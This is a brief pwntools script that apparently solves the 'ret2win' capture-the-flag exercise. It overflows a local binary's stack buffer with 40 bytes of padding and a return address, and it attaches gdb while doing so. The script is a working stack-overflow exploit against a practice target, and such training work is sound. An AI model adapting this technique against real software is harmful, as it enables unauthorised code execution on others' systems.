from pwn import *

p = process("./ret2win")

payload = b"a"*40

payload = payload + p64(0x400756)

gdb.attach(p)

gdb.attach(p, gdbscript='b *main')

p.sendline(payload)

p.interactive()
